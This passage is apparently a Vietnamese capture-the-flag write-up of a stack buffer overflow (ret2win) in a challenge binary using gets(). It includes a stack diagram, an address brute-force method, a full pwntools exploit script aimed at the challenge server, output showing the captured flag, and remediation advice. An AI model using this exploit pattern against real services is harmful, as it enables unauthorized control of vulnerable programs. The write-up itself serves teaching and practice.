   - Hàm `gets(buffer)` không kiểm tra bounds, đọc dữ liệu cho đến khi gặp `\n` hoặc `EOF`.
   - Gửi dữ liệu vượt quá 64 bytes sẽ làm tràn `buffer`, ghi đè `Saved RBP` và `Return Address`.

---

### 3.3. Mô hình bộ nhớ Stack & Kỹ thuật ret2win

Bố cục Stack Frame của `vuln()` trên x86_64:

```text
Địa chỉ thấp (Low Memory)
┌──────────────────────────────────────────┐  <-- $rsp (Đỉnh stack)
│  buffer[0..63]                           │
│  (Vùng đệm lưu dữ liệu đầu vào: 64 bytes)│
├──────────────────────────────────────────┤  <-- $rbp (Frame Pointer)
│  Saved RBP                               │
│  (Base pointer của hàm gọi: 8 bytes)     │
├──────────────────────────────────────────┤  <-- $rbp + 0x8
│  Saved RIP / Return Address              │
│  (Địa chỉ quay về sau khi vuln() xong)   │
└──────────────────────────────────────────┘
Địa chỉ cao (High Memory)
```

- Offset từ đầu `buffer` đến `Return Address` = `64 + 8 = 72 bytes`.
- Ghi đè `Return Address` bằng địa chỉ của `win()` sẽ khiến CPU nhảy vào `win()` ngay khi lệnh `ret` được thực thi.

---

### 3.4. Phương pháp xác định địa chỉ mục tiêu (Target Discovery)

Thử thách chỉ cung cấp `echo.c`, không có binary biên dịch sẵn.
- Do không bật PIE, mã máy nằm ở vùng nhớ cố định `0x401000 - 0x402000`.
- Hàm `win()` được viết ở đầu file, nên nằm ở các địa chỉ đầu của phân vùng code người dùng.
- Tiến hành quét tự động các địa chỉ chẵn trong khoảng `0x401100 - 0x401250`:
  - Tại địa chỉ **`0x401216`**, server phản hồi thông báo hijacked và in cờ.

---

### 3.5. Mã nguồn khai thác hoàn chỉnh (Python / Pwntools)

```python
#!/usr/bin/env python3
"""
Challenge: Kuiper Belt Relay Core (PWN)
Exploit Technique: ret2win (Buffer Overflow via gets)
Architecture: Linux x86_64
"""

from pwn import *

HOST = "34.116.80.78"
PORT = 9998
OFFSET = 72            # 64 bytes buffer + 8 bytes saved RBP
WIN_ADDR = 0x401216    # Địa chỉ hàm win() trên server

def solve():
    log.info(f"Connecting to {HOST}:{PORT}...")
    r = remote(HOST, PORT)

    r.recvuntil(b"Enter your message: ")

    payload = b"A" * OFFSET + p64(WIN_ADDR)
    
    log.info(f"Sending payload ({len(payload)} bytes) -> win() @ {hex(WIN_ADDR)}")
    r.sendline(payload)

    response = r.recvall(timeout=3).decode(errors="replace")
    log.success("Response received from target:")
    print(response)

if __name__ == "__main__":
    solve()
```

---

### 3.6. Kết quả thực thi & Flag

```text
[+] Opening connection to 34.116.80.78 on port 9998: Done
[*] Sending payload (80 bytes) -> win() @ 0x401216
[+] Receiving all data: Done (178B)
[*] Closed connection to 34.116.80.78 port 9998
[+] Response received from target:
 You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  @

You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

**Flag chính thức:**
```text
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

---

### 3.7. Biện pháp phòng chống & Khắc phục lỗ hổng (Remediation)

1. **Thay thế `gets()`:** Sử dụng `fgets(buffer, sizeof(buffer), stdin)` để khống chế kích thước tối đa.
2. **Kích hoạt Stack Canary:** Cờ biên dịch `-fstack-protector-all`.
3. **Kích hoạt PIE & ASLR:** Biên dịch với `-fPIE -pie` để ngẫu nhiên hóa phân vùng code.
4. **Loại bỏ Dead Code:** Tối ưu hóa biên dịch `-O2` và `-Wl,--gc-sections`.
